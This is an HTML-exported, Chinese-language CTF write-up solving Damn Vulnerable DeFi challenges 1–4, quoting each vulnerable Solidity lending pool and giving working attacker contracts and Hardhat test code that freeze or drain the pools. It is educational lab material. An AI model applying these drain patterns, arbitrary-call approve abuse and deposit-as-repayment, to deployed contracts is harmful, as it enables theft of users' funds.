@@ -1,0 +1,662 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Damn1-4.md</title>
+<meta http-equiv="Content-type" content="text/html;charset=UTF-8">
+
+<style>
+/* https://github.com/microsoft/vscode/blob/master/extensions/markdown-language-features/media/markdown.css */
+/*---------------------------------------------------------------------------------------------
+ *  Copyright (c) Microsoft Corporation. All rights reserved.
+ *  Licensed under the MIT License. See License.txt in the project root for license information.
+ *--------------------------------------------------------------------------------------------*/
+
+body {
+	font-family: var(--vscode-markdown-font-family, -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif);
+	font-size: var(--vscode-markdown-font-size, 14px);
+	padding: 0 26px;
+	line-height: var(--vscode-markdown-line-height, 22px);
+	word-wrap: break-word;
+}
+
+#code-csp-warning {
+	position: fixed;
+	top: 0;
+	right: 0;
+	color: white;
+	margin: 16px;
+	text-align: center;
+	font-size: 12px;
+	font-family: sans-serif;
+	background-color:#444444;
+	cursor: pointer;
+	padding: 6px;
+	box-shadow: 1px 1px 1px rgba(0,0,0,.25);
+}
+
+#code-csp-warning:hover {
+	text-decoration: none;
+	background-color:#007acc;
+	box-shadow: 2px 2px 2px rgba(0,0,0,.25);
+}
+
+body.scrollBeyondLastLine {
+	margin-bottom: calc(100vh - 22px);
+}
+
+body.showEditorSelection .code-line {
+	position: relative;
+}
+
+body.showEditorSelection .code-active-line:before,
+body.showEditorSelection .code-line:hover:before {
+	content: "";
+	display: block;
+	position: absolute;
+	top: 0;
+	left: -12px;
+	height: 100%;
+}
+
+body.showEditorSelection li.code-active-line:before,
+body.showEditorSelection li.code-line:hover:before {
+	left: -30px;
+}
+
+.vscode-light.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(0, 0, 0, 0.15);
+}
+
+.vscode-light.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(0, 0, 0, 0.40);
+}
+
+.vscode-light.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+.vscode-dark.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(255, 255, 255, 0.4);
+}
+
+.vscode-dark.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(255, 255, 255, 0.60);
+}
+
+.vscode-dark.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+.vscode-high-contrast.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(255, 160, 0, 0.7);
+}
+
+.vscode-high-contrast.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(255, 160, 0, 1);
+}
+
+.vscode-high-contrast.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+img {
+	max-width: 100%;
+	max-height: 100%;
+}
+
+a {
+	text-decoration: none;
+}
+
+a:hover {
+	text-decoration: underline;
+}
+
+a:focus,
+input:focus,
+select:focus,
+textarea:focus {
+	outline: 1px solid -webkit-focus-ring-color;
+	outline-offset: -1px;
+}
+
+hr {
+	border: 0;
+	height: 2px;
+	border-bottom: 2px solid;
+}
+
+h1 {
+	padding-bottom: 0.3em;
+	line-height: 1.2;
+	border-bottom-width: 1px;
+	border-bottom-style: solid;
+}
+
+h1, h2, h3 {
+	font-weight: normal;
+}
+
+table {
+	border-collapse: collapse;
+}
+
+table > thead > tr > th {
+	text-align: left;
+	border-bottom: 1px solid;
+}
+
+table > thead > tr > th,
+table > thead > tr > td,
+table > tbody > tr > th,
+table > tbody > tr > td {
+	padding: 5px 10px;
+}
+
+table > tbody > tr + tr > td {
+	border-top: 1px solid;
+}
+
+blockquote {
+	margin: 0 7px 0 5px;
+	padding: 0 16px 0 10px;
+	border-left-width: 5px;
+	border-left-style: solid;
+}
+
+code {
+	font-family: Menlo, Monaco, Consolas, "Droid Sans Mono", "Courier New", monospace, "Droid Sans Fallback";
+	font-size: 1em;
+	line-height: 1.357em;
+}
+
+body.wordWrap pre {
+	white-space: pre-wrap;
+}
+
+pre:not(.hljs),
+pre.hljs code > div {
+	padding: 16px;
+	border-radius: 3px;
+	overflow: auto;
+}
+
+pre code {
+	color: var(--vscode-editor-foreground);
+	tab-size: 4;
+}
+
+/** Theming */
+
+.vscode-light pre {
+	background-color: rgba(220, 220, 220, 0.4);
+}
+
+.vscode-dark pre {
+	background-color: rgba(10, 10, 10, 0.4);
+}
+
+.vscode-high-contrast pre {
+	background-color: rgb(0, 0, 0);
+}
+
+.vscode-high-contrast h1 {
+	border-color: rgb(0, 0, 0);
+}
+
+.vscode-light table > thead > tr > th {
+	border-color: rgba(0, 0, 0, 0.69);
+}
+
+.vscode-dark table > thead > tr > th {
+	border-color: rgba(255, 255, 255, 0.69);
+}
+
+.vscode-light h1,
+.vscode-light hr,
+.vscode-light table > tbody > tr + tr > td {
+	border-color: rgba(0, 0, 0, 0.18);
+}
+
+.vscode-dark h1,
+.vscode-dark hr,
+.vscode-dark table > tbody > tr + tr > td {
+	border-color: rgba(255, 255, 255, 0.18);
+}
+
+</style>
+
+<style>
+/* Tomorrow Theme */
+/* http://jmblog.github.com/color-themes-for-google-code-highlightjs */
+/* Original theme - https://github.com/chriskempson/tomorrow-theme */
+
+/* Tomorrow Comment */
+.hljs-comment,
+.hljs-quote {
+	color: #8e908c;
+}
+
+/* Tomorrow Red */
+.hljs-variable,
+.hljs-template-variable,
+.hljs-tag,
+.hljs-name,
+.hljs-selector-id,
+.hljs-selector-class,
+.hljs-regexp,
+.hljs-deletion {
+	color: #c82829;
+}
+
+/* Tomorrow Orange */
+.hljs-number,
+.hljs-built_in,
+.hljs-builtin-name,
+.hljs-literal,
+.hljs-type,
+.hljs-params,
+.hljs-meta,
+.hljs-link {
+	color: #f5871f;
+}
+
+/* Tomorrow Yellow */
+.hljs-attribute {
+	color: #eab700;
+}
+
+/* Tomorrow Green */
+.hljs-string,
+.hljs-symbol,
+.hljs-bullet,
+.hljs-addition {
+	color: #718c00;
+}
+
+/* Tomorrow Blue */
+.hljs-title,
+.hljs-section {
+	color: #4271ae;
+}
+
+/* Tomorrow Purple */
+.hljs-keyword,
+.hljs-selector-tag {
+	color: #8959a8;
+}
+
+.hljs {
+	display: block;
+	overflow-x: auto;
+	color: #4d4d4c;
+	padding: 0.5em;
+}
+
+.hljs-emphasis {
+	font-style: italic;
+}
+
+.hljs-strong {
+	font-weight: bold;
+}
+</style>
+
+<style>
+/*
+ * Markdown PDF CSS
+ */
+
+ body {
+	font-family: -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif, "Meiryo";
+	padding: 0 12px;
+}
+
+pre {
+	background-color: #f8f8f8;
+	border: 1px solid #cccccc;
+	border-radius: 3px;
+	overflow-x: auto;
+	white-space: pre-wrap;
+	overflow-wrap: break-word;
+}
+
+pre:not(.hljs) {
+	padding: 23px;
+	line-height: 19px;
+}
+
+blockquote {
+	background: rgba(127, 127, 127, 0.1);
+	border-color: rgba(0, 122, 204, 0.5);
+}
+
+.emoji {
+	height: 1.4em;
+}
+
+code {
+	font-size: 14px;
+	line-height: 19px;
+}
+
+/* for inline code */
+:not(pre):not(.hljs) > code {
+	color: #C9AE75; /* Change the old color so it seems less like an error */
+	font-size: inherit;
+}
+
+/* Page Break : use <div class="page"/> to insert page break
+-------------------------------------------------------- */
+.page {
+	page-break-after: always;
+}
+
+</style>
+
+<script src="https://unpkg.com/mermaid/dist/mermaid.min.js"></script>
+</head>
+<body>
+  <script>
+    mermaid.initialize({
+      startOnLoad: true,
+      theme: document.body.classList.contains('vscode-dark') || document.body.classList.contains('vscode-high-contrast')
+          ? 'dark'
+          : 'default'
+    });
+  </script>
+<h1 id="damn-defi%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951-4">Damn Defi靶场刷题记录(1-4)</h1>
+<pre><code>author: Thomas_Xu
+</code></pre>
+<h2 id="1-unstoppable">1 Unstoppable</h2>
+<p>这一关没有什么太大的难度，主要是带领进入Damn的题目</p>
+<p>这道题是想让我们让这个闪电贷池停止工作</p>
+<p>我们首先看一下合约</p>
+<pre class="hljs"><code><div> // SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.0;
+
+import &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;
+import &quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;;
+
+interface IReceiver {
+    function receiveTokens(address tokenAddress, uint256 amount) external;
+}
+
+/**
+ * @title UnstoppableLender
+ * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
+ */
+contract UnstoppableLender is ReentrancyGuard {
+
+    IERC20 public immutable damnValuableToken;
+    uint256 public poolBalance;
+
+    constructor(address tokenAddress) {
+        require(tokenAddress != address(0), &quot;Token address cannot be zero&quot;);
+        damnValuableToken = IERC20(tokenAddress);
+    }
+
+    function depositTokens(uint256 amount) external nonReentrant {
+        require(amount &gt; 0, &quot;Must deposit at least one token&quot;);
+        // Transfer token from sender. Sender must have first approved them.
+        damnValuableToken.transferFrom(msg.sender, address(this), amount);
+        poolBalance = poolBalance + amount;
+    }
+
+    function flashLoan(uint256 borrowAmount) external nonReentrant {
+        require(borrowAmount &gt; 0, &quot;Must borrow at least one token&quot;);
+
+        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
+        require(balanceBefore &gt;= borrowAmount, &quot;Not enough tokens in pool&quot;);
+
+        // Ensured by the protocol via the `depositTokens` function
+        assert(poolBalance == balanceBefore);
+        
+        damnValuableToken.transfer(msg.sender, borrowAmount);
+        
+        IReceiver(msg.sender).receiveTokens(address(damnValuableToken), borrowAmount);
+        
+        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
+        require(balanceAfter &gt;= balanceBefore, &quot;Flash loan hasn't been paid back&quot;);
+    }
+}
+</div></code></pre>
+<p>可以注意到这个闪电贷函数是有明显问题的
+<code>assert(poolBalance == balanceBefore);</code>这个判断不严谨，poolBalance只有在调用depositTokens()函数存款时，才会增加，而如果我们通过ERC20的transfer来转账，balanceBefore余额会增加，但poolBalance并没有改变，这就会造成此闪电贷池宕机。</p>
+<ul>
+<li>解题步骤：
+我们只需要向该合约提交一笔转账即可
+<code>await this.token.transfer(this.pool.address, INITIAL_ATTACKER_BALANCE, { from: attacker} );</code></li>
+</ul>
+<h2 id="2-naive-reciever">2 naive-reciever</h2>
+<p>先看合约</p>
+<pre class="hljs"><code><div>contract NaiveReceiverLenderPool is ReentrancyGuard {
+   using SafeMath for uint256;
+   using Address for address;
+
+   uint256 private constant FIXED_FEE = 1 ether; // not the cheapest flash loan
+
+   function fixedFee() external pure returns (uint256) {
+       return FIXED_FEE;
+   }
+
+   function flashLoan(address payable borrower, uint256 borrowAmount) external nonReentrant {
+
+       uint256 balanceBefore = address(this).balance;
+       require(balanceBefore &gt;= borrowAmount, &quot;Not enough ETH in pool&quot;);
+
+
+       require(address(borrower).isContract(), &quot;Borrower must be a deployed contract&quot;);
+       // Transfer ETH and handle control to receiver
+       (bool success, ) = borrower.call{value: borrowAmount}(
+           abi.encodeWithSignature(
+               &quot;receiveEther(uint256)&quot;,
+               FIXED_FEE
+           )
+       );
+       require(success, &quot;External call failed&quot;);
+
+       require(
+           address(this).balance &gt;= balanceBefore.add(FIXED_FEE),
+           &quot;Flash loan hasn't been paid back&quot;
+       );
+   }
+
+   // Allow deposits of ETH
+   receive () external payable {}
+}
+</div></code></pre>
+<ul>
+<li>
+<p><strong>分析</strong>
+这个flashloan函数只要被调用一次就会抽取1ETH的小费，在这种时候，接收器必须要判断消息的发送者是否为自己，否则任何人都可以冒充接收器发送闪电贷请求。导致自己token的流失。</p>
+</li>
+<li>
+<p><strong>Exploit</strong>
+只需要循环调用flashloan函数即可</p>
+</li>
+</ul>
+<pre class="hljs"><code><div>for(let i = 0; i &lt; 10; i++){
+            await this.pool.connect(attacker).flashLoan(this.receiver.address, &quot;0&quot;);
+        }
+</div></code></pre>
+<h2 id="3-truster">3 Truster</h2>
+<p>这又是一个关于外部调用的一个漏洞
+先看代码</p>
+<pre class="hljs"><code><div>// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.0;
+
+import &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;
+import &quot;@openzeppelin/contracts/utils/Address.sol&quot;;
+import &quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;;
+
+/**
+ * @title TrusterLenderPool
+ * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
+ */
+contract TrusterLenderPool is ReentrancyGuard {
+
+    using Address for address;
+
+    IERC20 public immutable damnValuableToken;
+
+    constructor (address tokenAddress) {
+        damnValuableToken = IERC20(tokenAddress);
+    }
+
+    function flashLoan(
+        uint256 borrowAmount,
+        address borrower,
+        address target,
+        bytes calldata data
+    )
+        external
+        nonReentrant
+    {
+        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
+        require(balanceBefore &gt;= borrowAmount, &quot;Not enough tokens in pool&quot;);
+        
+        damnValuableToken.transfer(borrower, borrowAmount);
+        target.functionCall(data);
+
+        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
+        require(balanceAfter &gt;= balanceBefore, &quot;Flash loan hasn't been paid back&quot;);
+    }
+
+}
+
+</div></code></pre>
+<ul>
+<li><strong>分析</strong>
+<code>ReentrancyGuard</code>并不是能让你安枕无忧的防止外部调用的方法，在这种特定情况下，最大的问题是允许指定与借款人合同不同的呼叫目标。</li>
+<li><strong>Exploit</strong>
+我们注意到在此合约中指定了token地址，那么我们就可以获取到此token地址，通过借入的漏洞冒充pool池<code>approve</code>给我们一笔巨款，随后我们就可以把approve的这部分token拿到手。
+攻击合约如下</li>
+</ul>
+<pre class="hljs"><code><div>pragma solidity ^0.8.0;
+import &quot;./TrusterLenderPool.sol&quot;;
+import &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;
+
+interface ITrusterLenderPool{
+    function flashLoan(uint256 borrowAmount, address borrower, address target, bytes calldata data) external;
+}
+
+contract TrusterExploit{
+    ITrusterLenderPool cons;
+    uint256 balanceOfPool;
+    address tokenAdr;
+    address poolAdr;
+    constructor(address _pool, uint256 BalanceOfPool, address _token){
+        cons = ITrusterLenderPool(_pool);
+        poolAdr = _pool;
+        balanceOfPool = BalanceOfPool;
+        tokenAdr = _token;
+    }
+    function attack() public {
+        cons.flashLoan(0, msg.sender, tokenAdr, abi.encodeWithSignature(&quot;approve(address,uint256)&quot;, address(this), balanceOfPool));
+        IERC20 token = IERC20(tokenAdr);
+        token.transferFrom(poolAdr, msg.sender,balanceOfPool);
+    }
+}
+</div></code></pre>
+<pre class="hljs"><code><div>  it('Exploit', async function () {
+        /** CODE YOUR EXPLOIT HERE  */
+        const attackconst = await ethers.getContractFactory('TrusterExploit', attacker);
+        this.exploit = await attackconst.deploy(this.pool.address, TOKENS_IN_POOL, this.token.address);
+        await this.exploit.connect(attacker).attack();
+        
+    });
+</div></code></pre>
+<h2 id="4-side-entrance">4 side-entrance</h2>
+<p>先看代码</p>
+<pre class="hljs"><code><div>// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.0;
+import &quot;@openzeppelin/contracts/utils/Address.sol&quot;;
+
+interface IFlashLoanEtherReceiver {
+    function execute() external payable;
+}
+
+/**
+ * @title SideEntranceLenderPool
+ * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
+ */
+
+contract SideEntranceLenderPool {
+    using Address for address payable;
+
+    mapping (address =&gt; uint256) private balances;
+
+    function deposit() external payable {
+        balances[msg.sender] += msg.value;
+    }
+
+    function withdraw() external {
+        uint256 amountToWithdraw = balances[msg.sender];
+        balances[msg.sender] = 0;
+        payable(msg.sender).sendValue(amountToWithdraw);
+    }
+
+    function flashLoan(uint256 amount) external {
+        uint256 balanceBefore = address(this).balance;
+        require(balanceBefore &gt;= amount, &quot;Not enough ETH in balance&quot;);
+        
+        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
+
+        require(address(this).balance &gt;= balanceBefore, &quot;Flash loan hasn't been paid back&quot;);    
+    }
+}
+</div></code></pre>
+<ul>
+<li>
+<p><strong>分析</strong>
+通过阅读代码，我们可以明显的发现此题的flashloan的判断后缀条件有机可乘<code>require(address(this).balance &gt;= balanceBefore</code>这里检查的是当前合约的余额，而不是检查的借贷池里的余额，这导致我们可以通过存款<code>deposit</code>来伪造我们已经还款的事件。我们只需要在<code>receiver</code>里面存款，就可以使我们的balance不断增加。最后提款即可</p>
+</li>
+<li>
+<p><strong>Expolit</strong>
+根据分析写出攻击合约：</p>
+</li>
+</ul>
+<pre class="hljs"><code><div>pragma solidity ^0.8.0;
+
+import &quot;./SideEntranceLenderPool.sol&quot;;
+
+// interface IFlashLoanEtherReceiver {
+//     function execute() external payable;
+// }
+
+contract SideEntranceExploit is IFlashLoanEtherReceiver{
+    SideEntranceLenderPool pool;
+    address payable attacker;
+    constructor(address _pool){
+        pool = SideEntranceLenderPool(_pool);
+        attacker = payable(msg.sender);
+    }
+
+    function attack(uint256 _amount) public{
+        pool.flashLoan(_amount);
+        pool.withdraw();
+    }
+
+    function execute() external payable override {
+        pool.deposit{value:address(this).balance}();
+    }
+    
+    receive() external payable{
+        attacker.transfer(address(this).balance);
+    }
+}
+</div></code></pre>
+<pre class="hljs"><code><div>it('Exploit', async function () {
+        /** CODE YOUR EXPLOIT HERE */
+        const sideEnranceExploit = await ethers.getContractFactory('SideEntranceExploit', attacker);
+        this.exploit = await sideEnranceExploit.deploy(this.pool.address);
+        await this.exploit.connect(attacker).attack(ETHER_IN_POOL);
+    });
+</div></code></pre>
+
+</body>
+</html>
